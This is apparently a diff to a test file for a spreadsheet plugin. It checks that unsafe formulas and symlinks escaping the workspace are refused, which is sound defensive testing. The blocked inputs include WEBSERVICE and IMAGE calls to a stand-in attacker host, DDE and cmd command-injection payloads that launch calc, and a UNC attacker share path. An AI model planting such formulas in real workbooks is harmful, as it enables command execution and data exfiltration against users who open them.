@@ -240,7 +240,7 @@ describe("OpenWorkSpreadsheets", () => {
         ["B2", "number", "SUM(C1:C1)"],
       ]);
 
-      for (const formula of ['WEBSERVICE("http://attacker.invalid/")', "cmd|' /C calc'!A0", "rtd(\"prog\",,\"x\")", "'[Book1.xlsx]Sheet1'!A1", "[Book1]Sheet1!A1", "'\\\\attacker\\share\\[book]Sheet1'!A1", "IMAGE(\"http://attacker.invalid/p.png\")", "  "]) {
+      for (const formula of ['WEBSERVICE("http://attacker.invalid/")', "cmd|' /C calc'!A0", 'DDE("cmd","/c calc","!A0")', "rtd(\"prog\",,\"x\")", "'[Book1.xlsx]Sheet1'!A1", "[Book1]Sheet1!A1", "'\\\\attacker\\share\\[book]Sheet1'!A1", "IMAGE(\"http://attacker.invalid/p.png\")", "  "]) {
         await expect(write(plugin, { path: "unsafe.xlsx", sheets: [{ rows: [[{ formula }]] }] })).rejects.toThrow(/Formula in A1 .*only calculations inside the workbook are written/);
       }
       await expect(readFile(join(root, "unsafe.xlsx"))).rejects.toThrow();
@@ -268,6 +268,10 @@ describe("OpenWorkSpreadsheets", () => {
         await expect(read(plugin, { path: "../secret.xlsx" })).rejects.toThrow("outside the active workspace");
         await expect(read(plugin, { path: join(outside, "secret.xlsx") })).rejects.toThrow("outside the active workspace");
         await expect(read(plugin, { path: "linked/secret.xlsx" })).rejects.toThrow("resolves outside the active workspace");
+        // A file symlink inside the workspace that points outside is refused; one that stays inside still reads.
+        await symlink(join(outside, "secret.xlsx"), join(root, "outside-alias.xlsx"));
+        await expect(read(plugin, { path: "outside-alias.xlsx" })).rejects.toThrow("resolves outside the active workspace");
+        await expect(inspect(plugin, { path: "outside-alias.xlsx" })).rejects.toThrow("resolves outside the active workspace");
         await expect(write(plugin, { path: "../escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("outside the active workspace");
         await expect(write(plugin, { path: "linked/escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("resolves outside the active workspace");
         // A missing folder under a symlinked folder must not be created at the link target.
@@ -284,6 +288,10 @@ describe("OpenWorkSpreadsheets", () => {
         await expect(read(plugin, { path: "table.csv" })).rejects.toThrow("use the read tool");
         await expect(read(plugin, { path: "reports/q3.xlsx", sheet: "Nope" })).rejects.toThrow("was not found in the workspace");
         await write(plugin, { path: "reports/q3.xlsx", sheets: REPORT_SHEETS });
+        await symlink(join(root, "reports", "q3.xlsx"), join(root, "inside-alias.xlsx"));
+        expect(await read(plugin, { path: "inside-alias.xlsx" })).toContain("| 2 | EMEA | 1742.42 | TRUE | =B2/B3 |");
+        await mkdir(join(root, "folder.xlsx"));
+        await expect(read(plugin, { path: "folder.xlsx" })).rejects.toThrow("is not a regular file");
         await expect(read(plugin, { path: "reports/q3.xlsx", sheet: "Nope" })).rejects.toThrow('Sheet "Nope" was not found. Available sheets: "Summary", "Detail".');
         await expect(read(plugin, { path: "reports/q3.xlsx", sheet: "3" })).rejects.toThrow("out of range");
         await expect(read(plugin, { path: "reports/q3.xlsx", range: "nope" })).rejects.toThrow("not a valid A1-style range");
